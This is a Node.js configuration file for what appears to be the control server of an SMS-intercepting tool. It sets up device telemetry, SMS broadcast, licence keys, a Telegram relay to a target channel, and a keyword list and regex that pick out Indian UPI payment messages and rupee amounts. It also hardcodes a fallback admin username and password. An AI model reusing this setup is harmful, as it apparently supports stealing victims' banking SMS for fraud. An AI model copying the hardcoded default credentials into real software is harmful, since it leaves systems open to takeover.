"use strict";

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const BASE_DIR = path.resolve(__dirname, "..");
const SECRET_FILE = path.join(BASE_DIR, ".session_secret");

function envInt(name, def = 0) {
  const v = parseInt(process.env[name], 10);
  return Number.isFinite(v) ? v : def;
}
function envFlag(name) {
  return ["1", "true", "yes"].includes(String(process.env[name] || "").trim().toLowerCase());
}

const config = {
  BASE_DIR,
  ADMIN_FILE: path.join(BASE_DIR, "admin", "index.html"),
  SECRET_FILE,

  ADMIN_API_KEY: process.env.ADMIN_API_KEY || "",
  COOKIE_NAME: process.env.COOKIE_NAME || "tpc_admin_session",
  COOKIE_DOMAIN: process.env.COOKIE_DOMAIN || null,

  SESSION_TTL: 300,
  SESSION_MAX_AGE: 60 * 60 * 24 * 30,
  TOKEN_TTL: 60 * 60 * 24 * 30,

  DEFAULT_KEY_DAYS: envInt("USER_TRIAL_DAYS", 30),

  ONLINE_WINDOW_SECONDS: 90,
  MAX_TELEMETRY_KEYS: 60,
  MAX_TELEMETRY_STRING: 300,
  MAX_WS_TEXT_BYTES: 4_000_000,
  MAX_SMS_BODY: 1600,
  MAX_BROADCAST: 500,

  WS_PING_INTERVAL: 25,
  WS_IDLE_TIMEOUT: 120,
  OUTBOX_REPUSH_AFTER: 45,
  NUMBER_RETRY_AFTER: 300,

  STALE_AFTER_DAYS: envInt("DEVICE_STALE_DAYS", 7),
  IDLE_AFTER_HOURS: 24,
  SEND_STUCK_AFTER: 180,
  EVENT_PRUNE_LIMIT: 200000,

  LOGIN_MAX_TRIES: 10,
  LOGIN_LOCK_SECONDS: 120,

  KEY_ALPHABET: "ABCDEFGHJKLMNPQRSTUVWXYZ23456789",

  TELE_API_ID: envInt("TELE_API_ID", 0),
  TELE_API_HASH: process.env.TELE_API_HASH || "",
  TARGET_CHANNEL_ID: envInt("TARGET_CHANNEL_ID", 0),
  DEFAULT_FWD_USER: String(process.env.DEFAULT_FWD_USER || "").trim(),
  RELAY_SESSION_FILE: process.env.RELAY_SESSION_FILE || path.join(BASE_DIR, "relay_session"),

  VERSION: "5.5.0",
  LOG_LEVEL: process.env.LOG_LEVEL || "INFO",
  FORCE_SECURE: envFlag("COOKIE_SECURE"),

  UPI_KEYWORDS: ["upi", "credited", "debited", "vpa", "paid to", "received from"],
  AMOUNT_RE: /(?:rs.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)/i,
};

// ---- session secret (env -> file -> generate) ----
function loadSessionSecret() {
  const env = String(process.env.SESSION_SECRET || "").trim();
  if (env) return [env, "env"];
  try {
    if (fs.existsSync(SECRET_FILE)) {
      const v = fs.readFileSync(SECRET_FILE, "utf8").trim();
      if (v) return [v, "file"];
    }
  } catch (_) {}
  const v = crypto.randomBytes(48).toString("base64url");
  try { fs.writeFileSync(SECRET_FILE, v, { encoding: "utf8", mode: 0o600 }); } catch (_) {}
  return [v, "generated"];
}
const [SESSION_SECRET, SESSION_SECRET_SRC] = loadSessionSecret();
config.SESSION_SECRET = SESSION_SECRET;
config.SESSION_SECRET_SRC = SESSION_SECRET_SRC;

// ---- admins ----
function buildAdmins() {
  const users = {};
  const raw = String(process.env.ADMIN_USERS || "").trim();
  if (raw) {
    for (const pair of raw.split(",")) {
      const i = pair.indexOf(":");
      if (i > -1) {
        const u = pair.slice(0, i).trim();
        const p = pair.slice(i + 1).trim();
        if (u && p) users[u] = p;
      }
    }
  }
  const defU = process.env.ADMIN_USERNAME || "ivan";
  if (!(defU in users)) users[defU] = process.env.ADMIN_PASSWORD || "Ahad@198612";
  return users;
}
config.ADMINS = buildAdmins();

module.exports = config;